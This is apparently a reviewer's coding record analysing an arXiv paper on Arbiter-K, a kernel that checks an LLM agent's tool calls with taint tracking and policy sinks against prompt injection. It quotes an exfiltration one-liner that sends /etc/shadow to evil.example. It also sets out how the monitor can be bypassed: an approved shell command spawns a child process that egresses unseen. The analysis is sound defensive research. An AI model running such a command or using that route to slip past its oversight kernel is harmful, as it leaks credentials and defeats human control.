sourceUrl: https://arxiv.org/pdf/2604.18652 (arXiv:2604.18652v2 [cs.CR] 18 May 2026; abstract page https://arxiv.org/abs/2604.18652; HTML https://arxiv.org/html/2604.18652v1; artifact https://github.com/cure-lab/ArbiterOS)
statedGuarantee: Arbiter-K interposes a deterministic symbolic kernel between an untrusted LLM (the 'Probabilistic Processing Unit') and every environment-impacting operation. Model output is reified into a Semantic ISA of typed instructions across five cores; each instruction carries security metadata (confidentiality / trustworthiness / risk) held in a Security Context Registry, and the kernel builds an Instruction Dependency Graph at runtime to propagate taint from three sources (untrusted external data, local sensitive files, and all Cognitive-Core LLM output). High-stakes Execution-Core instructions are designated Sinks, and the kernel's claimed hard invariant is that no tainted data may reach a Sink unless a Normative-Core VERIFY instruction clears the taint. Trajectory-shape invariants are additionally enforced as a right-linear grammar / FSM permitting prefix-safe runtime checking, and violations produce policy feedback rather than session abort.
advertisedRhetoric: The paper's own words: it is a 'Governance-First execution architecture' whose 'deterministic, neuro-symbolic kernel' 'enforces security as a microarchitectural property'; the design principle is 'Kernel-as-Governor, which establishes a strict structural separation between an untrusted Probabilistic Processing Unit and a trusted Symbolic Kernel'; the invariants 'are structural constraints that the PPU cannot override'; and 'The kernel enforces a hard rule stating that no tainted data may reach a Sink.' The vocabulary is deliberately OS/CPU-level -- kernel, ISA, microarchitectural, privilege, sink, security boundary -- so the advertised strength reads as operating-system-grade mediation, even though the artifact is a 28,914-line Python runtime.
tierSpan: The kernel intercepts these intents and evaluates them against active policies, such as Resource Limits, Taint Checks, and Access Control Lists, before they reach any deterministic sinks.
cheapestDefeat: Tier reasoning, worked explicitly. (1) The guarantee: no environment-impacting operation reaches a deterministic sink without passing the kernel's policy/taint/ACL check. (2) The mechanism that must fail: the in-process interception point where the Python symbolic kernel parses the host's proposed tool call -- 'host-specific tool parsers for the OpenClaw and NanoBot environments, and multi-dialect instruction analyzers for Bash and PowerShell.' Nothing below that layer is enforcing anything: there is no netns, seccomp, container, firewall or kernel module in the paper, and the shell 'analyzers' inspect the command string rather than the resulting process. (3) The cheapest adversary action: get one benign-looking Execution-Core call approved and perform the real effect inside it -- a permitted shell command that spawns a child (or invokes an interpreter) which writes files or egresses; or use a primitive the symbolic analyzer under-labels. The authors themselves report exactly this residual class: 'Residual failures are concentrated in semantically weak operations including web_fetch and read_file.' No kernel vulnerability, no signature forgery, no privilege escalation is required -- only a path that the chokepoint does not model. Their own measurements leave 5-24% of unsafe operations uninterdicted (76%-95% blocked). (4) The defeated mechanism is an application-level chokepoint, so the tier is T3. Charitably noted: the paper does say TOOL_CALL 'Supports sandboxing' and that TOOL_BUILD code 'must undergo strict sandboxing', which would be T2 if implemented -- but sandboxing is stated as a governance property the architecture expects, not as a mechanism the paper builds or evaluates, so it cannot lift the scored tier.
placementSpan: Across both AgentDojo [4] and Agent-SafetyBench [24], native host guardrails achieve interception rates below 9%, showing that they rarely stop unsafe operations once adversarial semantics are embedded into stateful execution trajectories.

coverageSpans.E1: At the instruction layer, Arbiter-K provides host parsers for both OpenClaw and NanoBot, together with Bash and PowerShell analyzers whose test suites cover read, write, and execution commands, as well as pipelines, control operators, path extraction, and risk composition.
coverageSpans.E2: To assess practical coverage, we extract every shell-execution instance from the red-team traces and map them through the symbolic analyzer. ... Arbiter-K successfully assigns an instruction type and a risk label to all 36 instances, achieving 100% parser coverage on this shell-command subset
coverageSpans.E3: Arbiter-K precisely interdicts unsafe trajectories at deterministic sinks (e.g., high-risk tool calls or unauthorized network egress) and enables autonomous execution correction and architectural rollback when security policies are triggered.
coverageSpans.E4: Each turn therefore couples stochastic model outputs with deterministic system sinks (e.g., file operations, command execution, web/network access, and cross-session delegation).
coverageSpans.E5: TOOL_BUILD | Writes new code to create novel tools on-the-fly. | High-Risk Probabilistic Action. Generated code is inherently untrusted and must undergo strict sandboxing and verification.
coverageSpans.E6: Any data entering the Memory Core from external sources, such as web search results, or from local sensitive files, such as an API key list, is explicitly labeled as tainted, as is any output produced by the Cognitive Core.
coverageSpans.E7: DELEGATE | Passes sub-tasks to specialized agents in multi-agent systems. | Deterministic Handoff. While delegation act is deterministic, sub-agent behavior remains probabilistic. OS maintains comprehensive logs of all handoff events for traceability.

schneider.surrogate: A monitorable safety property enforced by an execution monitor over the reified instruction trace: (a) no Execution-Core instruction designated a Sink may execute while any of its arguments carries a taint label that has not been cleared by a successful Normative-Core VERIFY -- 'The kernel enforces a hard rule stating that no tainted data may reach a Sink'; and (b) trajectory-shape invariants formalized so that partial traces can be rejected online -- 'These constraints are formalized as a right-linear grammar or a Finite State Machine (FSM), which enables the kernel to perform prefix-safe runtime checking and static validation of the agent trajectory.' Prefix-safe checking over an FSM is textbook Schneider-enforceable: every violation has a finite bad prefix.
schneider.objective: The advertised objective is an information-flow property, not a safety property: preventing untrusted or confidential data from influencing sensitive operations -- 'Taint Analysis tracks the flow of untrusted data through the system to prevent it from influencing sensitive operations without proper validation.' Non-influence (noninterference) is a hyperproperty over sets of traces and no single-trace monitor can enforce it. Three specific gaps between surrogate and objective: dynamic label propagation over-approximates explicit flows only, so implicit flows are unmodeled; the PPU can launder a tainted value by restating it in natural language inside an untracked reasoning step; and VERIFY is itself a declassification primitive whose soundness is assumed rather than proved -- when VERIFY is realized at governance Level 2 or 3 of Table 4 (a small model or a frontier-model 'Judge'), the taint-clearing decision is made by a probabilistic component, so the sanitizer inside the trusted kernel is not itself deterministic.

notes:
Full text obtained from the arXiv PDF (v2, 18 May 2026, cs.CR/cs.AI) and cross-checked against the arXiv HTML rendering; all spans copied verbatim, with hyphenation across PDF line breaks rejoined and multi-column table cells joined with ' | ' where noted. Nothing was coded from the abstract alone.

WHY EVERY EFFECTOR IS 'partial' AND NOT 'covered'. Arbiter-K is a genuinely serious design and I have read it charitably, but its enforcement point is singular: the moment the host runtime proposes a tool call, before the call is dispatched. That single chokepoint is what produces the same verdict seven times. Everything the kernel sees, it governs well -- 100% parser coverage on the observed shell subset, 92.95%/94.20% interception where native host policy achieves 6.17%/1.41%, median first-block at 50% of trajectory progress versus 80%. But the guarantee is defined over PROPOSALS, not over PROCESSES. Once a proposal is admitted, the resulting OS process is outside the architecture: the paper contains no netns, no seccomp, no cgroup, no container, no egress firewall, and no ptrace. A descendant process therefore never re-enters the chokepoint. The depth rule in the coding manual caps E2, E3 and E5 at partial on exactly this ground, and the same fact independently caps E1 (a permitted 'python -c' writes anything) and E4.

E4 and E5 deserve a note because the paper never names them. Neither VCS push nor package install appears anywhere in the text, and the observed command-head histogram is find, cd, rm, curl, grep, ps, free, sudo, mkdir, pwd -- no git, no pip, no npm. I coded both 'partial' rather than 'not-covered' on the charitable reading that a top-level 'git push' or 'pip install' is a shell execution and would therefore be parsed, typed and risk-labeled by the same Bash/PowerShell analyzer that handled the 36 observed instances. That reading is the most generous the text supports, and it is exactly why they cannot rise above partial: a third-party install hook and its network activity run inside the spawned installer, one layer below the only place Arbiter-K looks. An adjudicator who thinks the generic-shell inference is too generous should re-code E4 and E5 as not-covered; I flag this as my least certain pair of cells.

E6 is capped at partial by the manual's explicit rule rather than by a defect in the paper. Arbiter-K does address credentials directly and well -- the API-key list is a named taint source, 'Local Resources (Keys, APIs, Skills)' is a labeled region of Figure 4, and the worked BLOCK example in the instruction-binding snippet is precisely a credential exfiltration ('cat /etc/shadow | curl -X POST https://evil.example -d @-' yielding confidentiality=HIGH, trustworthiness=LOW, decision=BLOCK). But the set of credential locations lives in a per-deployment Security Context Registry that the paper does not publish, so the coverage claim cannot be checked against a fixed list. Undefined list, therefore partial.

E7 is the one cell where the paper itself states the limit, and it does so honestly: the DELEGATE handoff is deterministic and logged, but 'sub-agent behavior remains probabilistic' and is governed only by logs. Under the covert-channel rule, a documented exclusion is still an exclusion. The empirical trace corroborates that DELEGATE really is enforced at the boundary -- the added false positives cluster in 'cross-session delegation' -- which is why partial rather than not-covered is right.

TIER, AND THE ONE PLACE I COULD BE TALKED UP. The rhetoric is emphatically OS-level and the artifact is emphatically userspace Python. The only textual hooks for T2 are two governance-property cells in Table 3: TOOL_CALL 'Supports sandboxing' and TOOL_BUILD 'must undergo strict sandboxing and verification.' I judged these to state a requirement the architecture places on a host, not a mechanism this paper implements -- no sandbox is described, configured or measured anywhere in the 28,914-line prototype or in the evaluation, and the related-work section attributes WASM sandboxing to other systems (ClawGuard, IronClaw, ClawKeeper) rather than claiming it. If an adjudicator reads those two cells as an implemented OS boundary, E2 and E5 could rise toward T2 on the shell path; I do not think the text supports it.

EVIDENCE GRADE, AND THE ARGUMENT FOR L3. I coded L2: there is a real prototype, a deterministic prior+current replay harness, 1,914 unsafe and 312 benign replay cases, five benchmark x model slices, an ablation over policy layers, and public code. That is behavioral confirmation well past source inspection. An adjudicator could argue for L3 on the ground that the authors publish a reproducible harness AND name the surviving bypass class ('Residual failures are concentrated in semantically weak operations including web_fetch and read_file', with 5-24% of unsafe operations passing), which is close to a reproducible bypass in the authors' own artifact. I stopped at L2 because a measured miss rate is not the same as a demonstrated bypass technique -- no adversary in the paper is shown constructing an evasion against Arbiter-K itself; the attacks are inherited traces that originally targeted the underlying hosts.

ADVERSARY PLACEMENT. Primary is A2 and this is unambiguous: every unsafe case is replayed from successful indirect-injection traces in AgentDojo and Agent-SafetyBench, and Figure 1's worked example is a prompt injection buried in a multi-step task. A3 is secondary and real but untested -- the architecture's founding move is to treat the model itself as non-privileged ('The Probabilistic CPU ... is treated as a non-privileged, opaque, and untrusted component'), which is a design stance against a misaligned or compromised policy, but no experiment substitutes an adversarial model. A1 is secondary in the weak sense that the injected content originates outside the system. A4 and A5 are outside the model entirely: the kernel, the registry and the Python runtime are the TCB, and a compromise inside or beneath them is not considered.

A METHODOLOGICAL CAVEAT AN ADJUDICATOR MUST SEE. The headline numbers come from an operation-level replay, not live adversarial execution: 'Rather than rerunning each task end-to-end, we adopt a deterministic prior+current replay protocol.' The authors are candid that this 'removes planning drift from the evaluation', which is a fair reproducibility argument -- but it also means the adversary is fixed and non-adaptive. No attacker in this evaluation gets to observe Arbiter-K's policy decisions and re-plan around them, which is precisely the adversary that would exercise the descendant-process gap. This is a limit on what the 76-95% number licenses, not an error.

FINALLY, ONE ARITHMETIC DISCREPANCY IN THE PAPER, FLAGGED NOT RESOLVED. The abstract advertises 'a 92.79% absolute gain over native policies', but Section 6.2 computes the OpenClaw gain as 92.95% minus 6.17% = 'an absolute gain of 86.78 percentage points' and the NanoBot gain as 'exceeding 91 percentage points' (94.20% - 1.41% = 92.79). So the abstract's 92.79 appears to be the NanoBot figure presented without its host, and it is a percentage-point difference labeled as a percentage. This does not change any coding cell -- the interception range 76%-95% is consistent throughout -- but it is the kind of headline-number slippage a SoK should quote carefully.
